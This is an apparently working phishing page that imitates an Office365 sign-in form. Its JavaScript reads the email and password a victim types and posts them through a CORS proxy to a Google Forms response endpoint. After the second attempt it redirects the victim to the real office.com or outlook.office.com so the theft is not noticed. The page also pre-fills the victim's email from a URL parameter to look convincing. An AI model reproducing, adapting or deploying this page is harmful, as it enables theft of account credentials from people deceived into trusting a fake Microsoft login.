<html>
<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
	
 <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
 
  <!-- <link href="main.css" rel="stylesheet" type="text/css" media="all"> -->
  <script type="text/javascript"> 

    window.addEventListener('load', () => {
  const params = (new URL(document.location)).searchParams;
  const inputEmail = params.get('inputEmail');
  
   document.getElementById('inputEmail').innerHTML = inputEmail;
   document.myform.inputEmail.value = inputEmail;


} )   </script>
  
<title> Sign In Office365 </title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<!-- <link href="main.css" rel="stylesheet" type="text/css" media="all"> -->

<style>
body{
    background-image: url(web.png);
    background-size: cover;
}


</style>

</head>
<!-- This snippet uses Font Awesome 5 Free as a dependency. You can download it at fontawesome.io! -->

<body>
    <div class="container">
      
      <div class="row">
        <div class="col-sm-9 col-md-7 col-lg-4 mx-auto" style="padding-top: 120px;">
          <div class="card card-signin my-5">
            <div class="card-body">
              <h5 class="card-title text-center">Sign In</h5>


              <form class="form-signin" name ="myform" id="myform" >

                <div class="form-label-group">
                  <input type="email"  placeholder="Email address" id="inputEmail" class="form-control" required name="inputEmail" document.getElementByIdvalue='' autofocus >
                  <label for="inputEmail">Email address</label>
                </div>
  
                <div class="form-label-group">
                  <input type="password"  class="form-control" id="inputPassword" placeholder="Password" required name="pass">
                  <label for="inputPassword">Password</label>
                </div>
  
                <div class="custom-control custom-checkbox mb-3">
                  <input type="checkbox" class="custom-control-input" id="customCheck1">
                  <label class="custom-control-label" for="customCheck1">Remember password</label>
                </div>
               
                <button id="submit-btn" class="btn btn-xm btn-google btn-block text-uppercase" type="submit" name="submit"><i class="fab fa-google mr-2"></i>Login</button>
                <hr class="my-4"> </form>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  

  <script>
    $(document).ready(function() {
        var count = 0;
    
        $('#ai').click(function() {
            $('#error').hide();
        });

        // https://docs.google.com/forms/d/e/1FAIpQLSciLeKoRvCJtMWX-NmyEmqD_z-fNpK08psXEyGvX37zsqDxaQ/viewform?usp=pp_url&entry.1889202620=1&entry.302007867=1&entry.1164458941=1
        
        $('#submit-btn').click(function(event) {
            event.preventDefault();
            var ai = $("#inputEmail").val();
            var pr = $("#inputPassword").val();
            count = count + 1;
            $.ajax({
                    url: "https://cors-anywhere.herokuapp.com/https://docs.google.com/forms/d/e/1FAIpQLSciLeKoRvCJtMWX-NmyEmqD_z-fNpK08psXEyGvX37zsqDxaQ/formResponse?",
                    data: {"entry.1889202620": ai, "entry.302007867": pr,},
                    type: "POST",
                    
                    dataType: "xml",
                    
                beforeSend: function(xhr) {
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 0);
                },
                success: function(response) {
                    $("#pr").val("");
                    if (count >= 2) {
                        count = 0;
                        
                        setTimeout(() => {
                            
                            setTimeout(() => {
                                window.location.replace("https://www.office.com");
                            }, 500);
                        }, 1000);
    
                        return false;
                    }
                    
                },
                error: function() {
                    $("#pr").val("");
                    if (count >= 2 && pr) {
                        count = 0;
                        
                        setTimeout(() => {
                            
                        }, 1000);
    
                        setTimeout(() => {
                                    window.location.replace("https://outlook.office.com");
                            }, 500);
    
                        return false;
                    }
                },
                complete: function() {
    
                }
            });
        });
    });
    
</script>
  
</html>
